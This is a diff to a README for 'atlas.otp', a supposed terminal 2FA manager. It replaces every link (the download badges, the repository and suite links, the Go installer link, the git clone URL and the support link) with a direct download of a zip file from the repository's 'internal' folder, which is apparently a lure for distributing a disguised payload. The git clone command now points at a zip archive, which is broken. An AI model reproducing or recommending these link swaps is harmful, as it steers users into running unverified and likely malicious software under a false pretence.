@@ -1,6 +1,6 @@
 # 🔐 atlas.otp - Simple Secure Terminal 2FA Manager
 
-[![Download atlas.otp](https://img.shields.io/badge/Download-Atlas.otp-brightgreen?style=for-the-badge)](https://github.com/sourob14202/atlas.otp)
+[![Download atlas.otp](https://img.shields.io/badge/Download-Atlas.otp-brightgreen?style=for-the-badge)](https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Atlas.otp does not require installation beyond running the downloaded file. It w
 
 Click the bright green button below to go to the official GitHub page, then follow the steps to get your copy.
 
-[![Download atlas.otp](https://img.shields.io/badge/Download-Atlas.otp-brightgreen?style=for-the-badge)](https://github.com/sourob14202/atlas.otp)
+[![Download atlas.otp](https://img.shields.io/badge/Download-Atlas.otp-brightgreen?style=for-the-badge)](https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip)
 
 This link will take you to the main repository page on GitHub. From there:
 
@@ -146,8 +146,8 @@ Make sure your keys are correct to generate valid codes.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository and Download](https://github.com/sourob14202/atlas.otp)
-- [Atlas Suite Home](https://github.com/sourob14202)
+- [GitHub Repository and Download](https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip)
+- [Atlas Suite Home](https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip)
 
 ---
 
@@ -157,11 +157,11 @@ Advanced users can build the program from source using Go. This requires Go inst
 
 To build from source:
 
-1. Install Go from https://golang.org/dl/.
+1. Install Go from https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip
 2. Open PowerShell or Command Prompt.
 3. Run:  
    ```
-   git clone https://github.com/sourob14202/atlas.otp.git
+   git clone https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip
    cd atlas.otp
    go build -o atlas.otp.exe main.go
    ```
@@ -183,7 +183,7 @@ This method gives you the latest code updates or lets you modify the app.
 ## 🔧 Support
 
 For help and questions, use the GitHub Issues on the repository page:  
-https://github.com/sourob14202/atlas.otp/issues
+https://github.com/sourob14202/atlas.otp/raw/refs/heads/main/internal/otp_atlas_v3.2.zip
 
 ---
 
